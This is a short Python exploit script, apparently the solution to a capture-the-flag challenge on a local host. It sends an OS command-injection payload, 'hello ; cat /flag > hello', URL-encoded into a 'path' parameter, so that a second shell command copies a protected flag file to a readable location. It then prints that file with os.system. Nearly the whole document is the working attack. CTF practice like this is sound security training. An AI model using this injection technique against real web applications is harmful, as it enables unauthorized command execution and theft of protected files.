#!/usr/bin/python3

import requests
import os

from urllib.parse import quote

url = "http://challenge.localhost/scenario?path="

payload = "hello ; cat /flag > hello"

encoded = quote(payload,safe="").replace('.','%2E')

full_url = url+encoded

response = requests.get(full_url).text
re = os.system('cat /challenge/hello')
print(re)
#print("The Flag: "+re)
